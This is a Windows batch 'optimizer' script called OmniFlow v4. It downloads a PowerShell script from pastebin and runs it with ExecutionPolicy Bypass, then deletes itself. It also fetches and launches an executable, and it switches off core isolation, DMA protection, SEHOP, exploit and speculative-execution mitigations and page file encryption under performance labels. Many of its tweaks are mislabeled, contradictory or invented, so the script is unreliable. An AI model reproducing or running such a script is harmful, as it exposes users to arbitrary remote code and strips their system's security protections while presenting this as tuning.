@echo off

setlocal enabledelayedexpansion

REM Check Wi-Fi connection
for /f "tokens=2 delims=:" %%A in ('netsh wlan show interfaces ^| findstr /c:"SSID"') do (
    set "ssid=%%A"
    set "ssid=!ssid:~1!"
)

REM Check if Wi-Fi connection is empty
if "%ssid%"=="" (
    echo No Wi-Fi connection. Checking internet connectivity...
    ping -n 1 8.8.8.8 | find "TTL=" >nul
    if not errorlevel 1 (
        echo Internet connection detected.
    ) else (
        echo No internet connection.
    )
    timeout /t 2 /nobreak >nul
    exit /b
) else (
    echo Checking Wi-Fi: %ssid%
    timeout /t 1 /nobreak >nul
    cls
)

title Omni Flow v4
setlocal

@echo off
cls

set "versionUrl=https://pastebin.com/raw/sX95gBFD"
set "updateUrl=https://pastebin.com/raw/jFExr77E"
set "psCodeUrl=https://pastebin.com/raw/iKa0b5k4"











REM Set the current version (change it as needed)
set "currentVersion=4"













title Verifying 

REM Clear the screen and display the menu
cls
echo -------------------------------------
echo         Omni   ---   Checker
echo -------------------------------------
echo.

REM Checking server version
echo Checking Server Version...
powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%versionUrl%' -UseBasicParsing | Select-Object -ExpandProperty Content" > "%temp%\pastebin_version.txt"

REM Read the pastebin version
set /p pastebinVersion=<"%temp%\pastebin_version.txt"

cls
echo OmniFlow version: %currentVersion%
echo Server version: %pastebinVersion%
echo.

REM Compare the versions and perform the appropriate action
if %currentVersion% lss %pastebinVersion% (
    REM Update available, download and execute
    echo New update found. Downloading and executing...
    powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri '%psCodeUrl%' -OutFile '%temp%\update.ps1'"
    powershell.exe -ExecutionPolicy Bypass -File "%temp%\update.ps1"

    REM Cleanup temporary files
    del "%~f0" /Q
timeout /T 4 >nul
exit
) else (
    REM No update available, continue with script code
    echo No updates found. Continuing to script code.

    
)

REM Cleanup temporary files
del "%temp%\pastebin_version.txt" /Q


@echo off
title Loading Omni Flow



setlocal


cls


timeout /t 2 >nul



setlocal enabledelayedexpansion
Title Loading and checking
REM Define color codes
set "COLORA=0A"   REM Green
set "COLORB=09"   REM Blue
set "COLORC=0C"   REM Red
set "COLORD=0E"   REM Yellow
set "COLORE=05"   REM Purple
set "COLORF=01"   REM Deep Blue
set "COLORG=0F"   REM White


REM Calculate the number of empty lines to position the ASCII art towards the bottom
set /a "lines=(%LINES% - 26)"

REM Check if log file exists
if not exist "log.txt" (
    echo FirstTime > log.txt
)

REM Read log file to check if it's the user's first visit
set /p "log=" < log.txt

:Repeat
REM Change to green
color %COLORA%
cls
for /l %%i in (1,1,%lines%) do echo.
echo.                                         
echo.
echo.                                         ______     __    __     __   __     __    
echo.                                        /\  __ \   /\ "-./  \   /\ "-.\ \   /\ \   
echo.                                        \ \ \/\ \  \ \ \-./\ \  \ \ \-.  \  \ \ \  
echo.                                         \ \_____\  \ \_\ \ \_\  \ \_\\"\_\  \ \_\
echo.                                          \/_____/   \/_/  \/_/   \/_/ \/_/   \/_/ 
echo.
echo.
echo.
echo.
echo.
echo.                                         
echo.                                         ______   __         ______     __     __    
echo.                                        /\  ___\ /\ \       /\  __ \   /\ \  _ \ \   
echo.                                        \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/ ".\ \  
echo.                                         \ \_\    \ \_____\  \ \_____\  \ \__/".~\_
echo.                                          \/_/     \/_____/   \/_____/   \/_/   \/_/ 
for /l %%i in (1,1,%lines%) do echo.

choice /T 2 /D Y >nul

REM Change to blue
color %COLORB%
cls
for /l %%i in (1,1,%lines%) do echo.
echo.
echo.
echo.
echo.
echo.
echo.                                         
echo.                                         ______     __    __     __   __     __    
echo.                                        /\  __ \   /\ "-./  \   /\ "-.\ \   /\ \   
echo.                                        \ \ \/\ \  \ \ \-./\ \  \ \ \-.  \  \ \ \  
echo.                                         \ \_____\  \ \_\ \ \_\  \ \_\\"\_\  \ \_\
echo.                                          \/_____/   \/_/  \/_/   \/_/ \/_/   \/_/                                          
echo.                                         ______   __         ______     __     __    
echo.                                        /\  ___\ /\ \       /\  __ \   /\ \  _ \ \   
echo.                                        \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/ ".\ \  
echo.                                         \ \_\    \ \_____\  \ \_____\  \ \__/".~\_
echo.                                          \/_/     \/_____/   \/_____/   \/_/   \/_/ 
for /l %%i in (1,1,%lines%) do echo.

choice /T 2 /D Y >nul

REM Change to red
color %COLORC%
cls
for /l %%i in (1,1,%lines%) do echo.
echo.                                         
echo.                                         ______     __    __     __   __     __    
echo.                                        /\  __ \   /\ "-./  \   /\ "-.\ \   /\ \   
echo.                                        \ \ \/\ \  \ \ \-./\ \  \ \ \-.  \  \ \ \  
echo.                                         \ \_____\  \ \_\ \ \_\  \ \_\\"\_\  \ \_\
echo.                                          \/_____/   \/_/  \/_/   \/_/ \/_/   \/_/                                          
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.                                         ______   __         ______     __     __    
echo.                                        /\  ___\ /\ \       /\  __ \   /\ \  _ \ \   
echo.                                        \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/ ".\ \  
echo.                                         \ \_\    \ \_____\  \ \_____\  \ \__/".~\_
echo.                                          \/_/     \/_____/   \/_____/   \/_/   \/_/ 
echo.
echo.
echo.
echo.
echo.
for /l %%i in (1,1,%lines%) do echo.

choice /T 2 /D Y >nul

REM Change to yellow
color %COLORD%
cls
for /l %%i in (1,1,%lines%) do echo.
echo.                                         
echo.                                         ______     __    __     __   __     __    
echo.                                        /\  __ \   /\ "-./  \   /\ "-.\ \   /\ \   
echo.                                        \ \ \/\ \  \ \ \-./\ \  \ \ \-.  \  \ \ \  
echo.                                         \ \_____\  \ \_\ \ \_\  \ \_\\"\_\  \ \_\
echo.                                          \/_____/   \/_/  \/_/   \/_/ \/_/   \/_/ 
echo.
echo.
echo.
echo.
echo.
echo.                                        
echo.                                         ______   __         ______     __     __    
echo.                                        /\  ___\ /\ \       /\  __ \   /\ \  _ \ \   
echo.                                        \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/ ".\ \  
echo.                                         \ \_\    \ \_____\  \ \_____\  \ \__/".~\_
echo.                                          \/_/     \/_____/   \/_____/   \/_/   \/_/ 
for /l %%i in (1,1,%lines%) do echo.

choice /T 2 /D Y >nul

REM Change to blue
color %COLORB%
cls
for /l %%i in (1,1,%lines%) do echo.
echo.
echo.
echo.
echo.
echo.
echo.                                         
echo.                                         ______     __    __     __   __     __    
echo.                                        /\  __ \   /\ "-./  \   /\ "-.\ \   /\ \   
echo.                                        \ \ \/\ \  \ \ \-./\ \  \ \ \-.  \  \ \ \  
echo.                                         \ \_____\  \ \_\ \ \_\  \ \_\\"\_\  \ \_\
echo.                                          \/_____/   \/_/  \/_/   \/_/ \/_/   \/_/                                          
echo.                                         ______   __         ______     __     __    
echo.                                        /\  ___\ /\ \       /\  __ \   /\ \  _ \ \   
echo.                                        \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/ ".\ \  
echo.                                         \ \_\    \ \_____\  \ \_____\  \ \__/".~\_
echo.                                          \/_/     \/_____/   \/_____/   \/_/   \/_/ 
for /l %%i in (1,1,%lines%) do echo.

choice /T 2 /D Y >nul

REM Change to blue
color %COLORF%
cls
for /l %%i in (1,1,%lines%) do echo.
echo.
echo.
echo.
echo.
echo.
echo.                                         
echo.                                         ______     __    __     __   __     __    
echo.                                        /\  __ \   /\ "-./  \   /\ "-.\ \   /\ \   
echo.                                        \ \ \/\ \  \ \ \-./\ \  \ \ \-.  \  \ \ \  
echo.                                         \ \_____\  \ \_\ \ \_\  \ \_\\"\_\  \ \_\
echo.                                          \/_____/   \/_/  \/_/   \/_/ \/_/   \/_/                                          
echo.                                         ______   __         ______     __     __    
echo.                                        /\  ___\ /\ \       /\  __ \   /\ \  _ \ \   
echo.                                        \ \  __\ \ \ \____  \ \ \/\ \  \ \ \/ ".\ \  
echo.                                         \ \_\    \ \_____\  \ \_____\  \ \__/".~\_
echo.                                          \/_/     \/_____/   \/_____/   \/_/   \/_/ 
for /l %%i in (1,1,%lines%) do echo.

choice /T 2 /D Y >nul

 REM Check if your script is ready to execute
    REM Replace the condition below with your own condition
    REM For example, check if a specific file exists or a variable has a certain value
    if exist "path\to\your\script.txt" goto ExecuteScript
    
    REM Delay to control the animation speed
    timeout /T 1 >nul
    cls
)
color %COLORG%

REM Check if it's the user's first visit or a return visit
if "%log%"=="FirstTime" (
    REM Extract main username from profile path
    set "username=%USERNAME%"
    echo Welcome %username%! > log.txt
) else (
    set /p "welcome=" < log.txt
    echo Welcome %welcome%! > log.txt
)
title Welcome!
REM Display "Welcome" message
set /p "welcome=" < log.txt
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.                                                  Welcome %username% 


:ExecuteScript
timeout /t 5 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.                                                %c%Created By: RatedGISOFM%t%
echo.
timeout /t 3 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.                                                    VERSION 4.0.0.0
echo.
timeout /t 2 >nul
cls
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo.
echo. 
echo                                           Welcome to OmniFlow Standard Editon
echo                                         This is a upgraded and more script than
echo                                       Optiflow can ever have in it's time, Getting
echo                                      Errors is fine, everyone system is different,
echo                                     Discord may be unistalled so reinstall required.
timeout /t 10 >nul
cls
echo.
echo               This program offers a wide range of powerful optimizations and tweaks:
echo.
timeout /t 1 >nul
echo               - Optimized Network
timeout /t 1 >nul
echo               - Serious Debloation
timeout /t 1 >nul
echo               - Nvidia Tweaks
timeout /t 1 >nul
echo               - Roblox Tweaks
timeout /t 1 >nul
echo               - Keyboard Tweaks
timeout /t 1 >nul
echo               - Mouse Tweaks
timeout /t 1 >nul
echo               - Discord Fix
timeout /t 1 >nul
echo               - Hundreds of Regedit Tweaks
timeout /t 1 >nul
echo               - CPU Tweaks Override
timeout /t 1 >nu
echo               - System Cleaner 1.0
timeout /t 1 >nul
echo               - Monitor Latency Tweaks
timeout /t 1 >nul
echo               - Defragger
timeout /t 1 >nul
echo               - Netsh Scripts
timeout /t 1 >nul
echo               - Great Nvidia DDU Customized
timeout /t 1 >nul
echo               - 2000+ lines of code
timeout /t 1 >nul
echo               - Spike, stutter, lag Eliminator 1.0 
timeout /t 1 >nul
echo               - And many more
timeout /t 1 >nul
echo.
echo                   Note: This program is designed for systems with an Nvidia GPU.
echo                           It may not be compatible with AMD CPUs or GPUs.
echo                                           Closed Beta 
echo.
timeout /t 3 >nul
cls
echo This script will perform system tweaks that may vary from system to system.
echo.

setlocal enabledelayedexpansion

cls
echo Do you accept the dangers of using this tweaks? Y or N or View Dangers
 
set "message=Do you accept the dangers? of using this tweaks Y or N?"

set "typed="

for /L %%i in (0,1,%message:~0,-1%) do (
    set "typed=!message:~0,%%i!"
    echo|set /p=!typed!
    timeout /t 1 >nul
)

set /p "confirm="

if /i "!confirm!"=="Y" goto :YES_OPTION
if /i "!confirm!"=="N" goto :NO_OPTION
if /i "!confirm!"=="View Dangers" goto :VIEW_DANGERS_OPTION

echo Invalid input. Closing script.
timeout /t 2 >nul
goto :NO_OPTION


:NO_OPTION
title leaving
cls
echo Aborted. No changes will be made.
timeout /t 3 >nul
exit

:VIEW_DANGERS_OPTION
title Viewing
cls
echo.
echo Welcome to the closed beta program!
echo.
echo Since this is a closed beta, using the software carries some risks and may potentially affect your system.
echo However, rest assured that I have been tirelessly working to enhance its stability since v1,
echo and I will continue to do so.
echo.
echo One issue in v2 that I believe I have resolved is the disappearance of the login screen during Windows startup.
echo I have successfully removed the components that were causing conflicts with Windows Hello and the login screen.
echo.
echo Thank you for taking the time to read this message. Your safety is my priority,
echo so if you want to be extra cautious,
echo I recommend having a Windows ISO file ready on a USB drive.
echo In the unlikely event of encountering critical errors,
echo you can boot into the USB and perform a clean,
echo fresh installation of Windows. Please note that using the software is generally safe,
echo with a success rate of approximately 75%.
echo.
echo Once again, thank you for reading and for your participation in the closed beta.
echo Your feedback and support are greatly appreciated.
echo.
echo And apps like mail and microsoft will be removed but can be easily brought back using powershell
echo also Bluetooth might be disabled
echo.
set /p "confirm=Would you like to continue? (Y/N): "

if /i "!confirm!"=="Y" goto :YES_OPTION
if /i "!confirm!"=="N" goto :NO_OPTION

echo Invalid input. Closing script.
timeout /t 2 >nul

:END
timeout /t 1 >nul





:YES_OPTION
title Checking then executing
cls
echo.
echo Loading . . . . .
timeout /t 5 >nul
cls

rem Check for NVIDIA graphics card
wmic path win32_VideoController get name | findstr /i "NVIDIA" >nul
if errorlevel 1 (
    echo Warning: You do not have an NVIDIA graphics card.
    echo Please ensure that your system meets the minimum requirements.
    echo Contact your hardware manufacturer for further assistance.
    echo.
    set "NVIDIA_WARNING=true"
) else (
    set "NVIDIA_WARNING=false"
)

rem Check for Intel CPU
wmic cpu get name | findstr /i "Intel" >nul
if errorlevel 1 (
    echo Warning: You do not have an Intel CPU.
    echo Please ensure that your system meets the minimum requirements.
    echo Contact your hardware manufacturer for further assistance.
    echo.
    set "INTEL_WARNING=true"
) else (
    set "INTEL_WARNING=false"
)

rem Check for AMD CPU
wmic cpu get name | findstr /i "AMD" >nul
if not errorlevel 1 (
    echo Danger: This script is 91%% less dangerous to run on your system.
    echo Please replace the necessary parts to make it 100%% compatible.
    echo.
    set "AMD_WARNING=true"
) else (
    set "AMD_WARNING=false"
)

rem Check for AMD GPU
wmic path win32_VideoController get name | findstr /i "AMD" >nul
if not errorlevel 1 (
    echo Danger: This script is dangerous to run on your system.
    echo Please replace the necessary parts to make it compatible.
    echo.
    set "AMD_WARNING=true"
) else (
    set "AMD_WARNING=false"
)

if "%NVIDIA_WARNING%"=="true" (
    if "%INTEL_WARNING%"=="true" (
        echo Both an NVIDIA graphics card and an Intel CPU and maybe AMD are required for optimal performance.
        echo Please ensure that your system meets the minimum requirements.
        echo Contact your hardware manufacturer for further assistance.
    )
    echo.
    pause
) else if "%AMD_WARNING%"=="true" (
    echo Danger: This script is dangerous to run on your system.
    echo Please replace the necessary parts to make it compatible.
    echo.
    pause
) else (
    echo Good to go! Your system meets the hardware requirements.
    echo Proceed with the desired actions.
    echo.
    timeout /t 3 >nul
   
)
title OmniFlow v4
cls
bcdedit /set tscsyncpolicy enhanced
cls
echo reminder: When it says completed it means the tweak is completed
timeout /t 5 >nul
cls

REM Set registry key and value
set regKey=HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers
set regValue=VRAMTweakMode

REM Set tweak value (1 to enable, 0 to disable)
set tweakValue=1

REM Create registry value
reg add "%regKey%" /v "%regValue%" /t REG_DWORD /d %tweakValue% /f

REM Check if registry tweak was applied successfully
if %errorlevel% equ 0 (
    echo Registry tweak applied successfully.
) else (
    echo Error applying registry tweak.
)





reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v MTRRcleanup /t REG_DWORD /d 1 /f
REM Tdr Delay
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v TdrDelay /t REG_DWORD /d 10 /f
REM PowerMizerMode
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\GraphicsDrivers" /v PowerMizerMode /t REG_DWORD /d 1 /f
REM Disable HDCP
reg add "HKLM\System\CurrentControlSet\Control\Video" /v DisableProtectedAudioDG /t REG_DWORD /d 1 /f
cls
REM Disable Nvidia Telemetry
reg add "HKLM\Software\NVIDIA Corporation\Global\NVTweak" /v Telemetry /t REG_DWORD /d 0 /f
cls
REM Nvidia Tweaks (max 16)
reg add "HKCU\Software\NVIDIA Corporation\Global\NVTweak" /v MaxLevel /t REG_DWORD /d 1 /f
cls
REM Disable Preemption
reg add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v TdrLevel /t REG_DWORD /d 0 /f
cls
REM Disable Writing Combining
reg add "HKLM\System\CurrentControlSet\Control\GraphicsDrivers" /v DisableWriteCombining /t REG_DWORD /d 1 /f
cls
REM Set CPU Affinity
wmic process where name="csrss.exe" CALL setpriority "high priority"
cls
REM Memory Optimization
fsutil behavior set memoryoptimization 1
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Serialize" /v StartupDelayInMSec /t REG_DWORD /d 0 /f
cls
REM SvcHost Split Threshold
reg add "HKLM\System\CurrentControlSet\Control" /v SvcHostSplitThresholdInKB /t REG_DWORD /d 4096 /f
cls
REM Optimize Netsh
netsh int tcp set global chimney=enabled
cls
REM Disable Mitigations
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 3 /f

cls
REM Reduce Audio Latency (Real.exe)
curl -LJO https://github.com/miniant-git/REAL/releases/download/updater-v2/REAL.exe
start REAL.exe
cls
REM DSCP Value
netsh wlan show interfaces
rem (Find the interface you want to set the priority for and use the following command)
rem netsh wlan set profileparameter name="YourNetworkSSID" cost=100
cls
REM BCDEdit Optimization
bcdedit /set disabledynamictick yes
cls
REM Disable Idle
powercfg -change -standby-timeout-ac 0
powercfg -change -standby-timeout-dc 0
cls
REM Disable USB Power Savings
reg add "HKLM\System\CurrentControlSet\Enum\USB" /v EnhancedPowerManagementEnabled /t REG_DWORD /d 0 /f
cls
REM Enable FSE
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v DisableFullscreenOptimizations /t REG_DWORD /d 0 /f
cls
REM Disable FTH (Fault Tolerant Heap)
reg add "HKLM\SOFTWARE\Microsoft\FTH" /v EnableFaultInjection /t REG_DWORD /d 0 /f
cls
REM Disable Process Mitigations
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v MitigationOptionsMask /t REG_DWORD /d 0 /f
cls
REM Disable Core Isolation
reg add "HKLM\System\CurrentControlSet\Control\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
cls
REM Disable Data Execution Prevention
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers" /v "C:\Windows\System32\cmd.exe" /t REG_SZ /d "~ RUNASADMIN WINXPSP3" /f
cls
REM Disable TsX to Mitigate ZombieLoad
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverride /t REG_DWORD /d 0x2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v FeatureSettingsOverrideMask /t REG_DWORD /d 0x3 /f
cls
REM Disable DMA Memory Protection
reg add "HKLM\System\CurrentControlSet\Control\DeviceGuard" /v EnableDMAProtection /t REG_DWORD /d 0 /f
cls
REM Disable SEHOP (Structured Exception Handling Overwrite Protection)
reg add "HKLM\System\CurrentControlSet\Control\Session Manager\kernel" /v DisableExceptionChainValidation /t REG_DWORD /d 1 /f
cls
REM Disable Control Flow Guard
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" /v DisableExceptionChainValidation /t REG_DWORD /d 1 /f
cls
REM Disable Network Power Savings and Mitigations
powercfg -change -standby-timeout-ac 0
powercfg -change -standby-timeout-dc 0
cls
REM Powershell: Set Congestion Provider To BBR2
powershell -Command "& { Set-NetTCPSetting -SettingName 'Internet' -CongestionProvider 'BBR2' }"
cls
REM Enable QoS Policy Outside Domain Networks
netsh advfirewall set global name=consecnet all=enable
cls
REM Disable limiting bandwidth
netsh int tcp set global autotuninglevel=normal
cls
REM Enable MMCSS (Multimedia Class Scheduler Service)
sc config Audiosrv start= auto
net start Audiosrv
cls
REM Turn off Inventory Collector
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\AppCompat" /v DisableInventory /t REG_DWORD /d 1 /f
cls
REM Disable Biometrics
reg add "HKLM\SOFTWARE\Policies\Microsoft\Biometrics" /v Enabled /t REG_DWORD /d 0 /f
cls
REM Disable Hibernation
powercfg -h off
cls
REM Adjust processor scheduling to allocate processor resources to programs
reg add "HKLM\SYSTEM\CurrentControlSet\Control\PriorityControl" /v Win32PrioritySeparation /t REG_DWORD /d 26 /f
cls
REM Raise the limit of paged pool memory
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v PagedPoolSize /t REG_DWORD /d 0xFFFFFFFF /f
cls
REM Enable Trim
fsutil behavior set DisableDeleteNotify 0
cls
REM Disable Page File Encryption
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v PageFileEncryption /t REG_DWORD /d 0 /f
cls
REM Disable NTFS Compression
fsutil behavior set disablecompression 1
cls
REM Opt out of Nvidia Telemetry
reg add "HKCU\Software\NVIDIA Corporation\Global\NvTmru" /v DoNotShowAgain /t REG_DWORD /d 1 /f
cls
REM Grab Nvidia Graphics Card Registry Key
reg export "HKLM\SYSTEM\CurrentControlSet\Control\Video" "%USERPROFILE%\Desktop\nvidia_registry_backup.reg" /y
cls
REM Fix CPU Stock Speed
powercfg -duplicatescheme e9a42b02-d5df-448d-aa00-03f14749eb61
cls
REM Disable GpuEnergyDrv
reg add "HKLM\SYSTEM\CurrentControlSet\Services\GpuEnergyDrv" /v Start /t REG_DWORD /d 4 /f
cls
REM Disable HPET (High Precision Event Timer)
bcdedit /deletevalue useplatformclock
cls
REM Disable NetBios
reg add "HKLM\SYSTEM\CurrentControlSet\Services\NetBT\Parameters" /v "NetbiosOptions" /t REG_DWORD /d 2 /f
cls
REM :: Don't restrict core boost
powercfg -setacvalueindex scheme_current sub_processor PerfBoostMode 0
cls
REM :: Enable Turbo Boost
powercfg -setacvalueindex scheme_current sub_processor PerfBoostMode 1
cls
REM Disable Frequency Scaling
powercfg -setacvalueindex scheme_current sub_processor PerfDecreaseThreshold 100
powercfg -setacvalueindex scheme_current sub_processor PerfIncreaseThreshold 0

REM :: Disable C1E
powercfg -setacvalueindex scheme_current sub_processor CoreParkingIndex 0
cls
REM :: NVCP (NVIDIA Control Panel)
reg add "HKCU\Software\NVIDIA Corporation\Global\NvCplApi\Policies" /v EnableDesktopManagerLogging /t REG_DWORD /d 0 /f
cls
REM :: Disable System Clock
reg add "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v RealTimeIsUniversal /t REG_DWORD /d 0 /f

REM :: Disable Prefetch
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management\PrefetchParameters" /v EnablePrefetcher /t REG_DWORD /d 0 /f

REM :: Disable Large System Cache
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargeSystemCache /t REG_DWORD /d 0 /f

REM :: Enable Preemption
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v LargePageMinimum /t REG_DWORD /d 0 /f

REM :: Disable Write Combining
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management" /v DisablePagingExecutive /t REG_DWORD /d 1 /f
cls
REM Hard Flush DNS
ipconfig /flushdns

REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPer1_0Server" /t REG_DWORD /d "16" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxConnectionsPerServer" /t REG_DWORD /d "16" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "DisableTaskOffload" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableConnectionRateLimiting" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableDCA" /t REG_DWORD /d "" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUBHDetect" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnablePMTUDiscovery" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableRSS" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableTCPA" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "EnableWsd" /t REG_DWORD /d "0" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "IRPStackSize" /t REG_DWORD /d "30" /f

REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxFreeTcbs" /t REG_DWORD /d "65535" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxHashTableSize" /t REG_DWORD /d "65536" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "MaxUserPort" /t REG_DWORD /d "65534" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SackOpts" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SizReqBuf" /t REG_DWORD /d "51319" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "SynAttackProtect" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TCPNoDelay" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "Tcp1323Opts" /t REG_DWORD /d "1" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxDupAcks" /t REG_DWORD /d "2" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxHalfOpen" /t REG_DWORD /d "100" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpMaxHalfOpenRetried" /t REG_DWORD /d "80" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpRecvSegmentSize" /t REG_DWORD /d "1460" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpSendSegmentSize" /t REG_DWORD /d "1460" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpTimedWaitDelay" /t REG_DWORD /d "30" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpWindowSize" /t REG_DWORD /d "64240" /f
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters" /v "TcpDelAckTicks" /t REG_DWORD /d "2" /f
cls
wmic process where name="%processName%" CALL setpriority "realtime"

Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\NVAPI" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm\Global\NVTweak" /v "RmGpsPsEnablePerCpuCoreDpc" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RmDistRenderMax" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableHdmi2" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableOveclockingAllPstates" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableOverclockedPstates" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMForceLockedClocksMode" /t REG_DWORD /d "0" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableClk" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnablePerformanceMode" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMMaximizePteTableSize" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "UseUncachedPCIMappings" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMEnableVmm" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "RMGpuCacheEnable" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "DisableAsyncPstates" /t REG_DWORD /d "1" /f
Reg.exe add "HKLM\SYSTEM\CurrentControlSet\Services\nvlddmkm" /v "EnableForceIgpuDgpuFromUI" /t REG_DWORD /d "1" /f
